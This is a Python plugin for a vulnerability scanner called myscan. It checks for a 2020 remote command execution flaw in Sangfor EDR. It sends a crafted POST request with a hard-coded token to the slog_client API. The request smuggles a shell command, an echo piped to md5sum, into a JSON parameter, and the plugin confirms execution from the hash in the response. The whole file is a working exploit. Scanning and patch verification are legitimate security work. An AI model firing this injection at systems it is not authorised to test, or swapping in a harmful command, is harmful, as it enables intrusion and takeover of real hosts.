# !/usr/bin/env python3
# @Time    : 2020-02-14
# @Author  : caicai
# @File    : __template.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.helper.helper_socket import socket_send_withssl, socket_send  # 如果需要，socket的方法封装
from myscan.config import scan_set
from myscan.lib.core.common import getmd5, get_random_str


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sangfor edr rce 202009"
        self.vulmsg = "no detail "
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        random_s = get_random_str(6)
        req = {
            "method": "POST",
            "url": self.url + "api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9",
            # "headers": headers,  # 主要保留cookie等headers
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers

            "timeout": 10,
            "data": r'''{"params":"w=123\"'1234123'\"|echo -n %s |md5sum"}''' % (random_s),
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r is not None and getmd5(random_s).encode() in r.content:
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
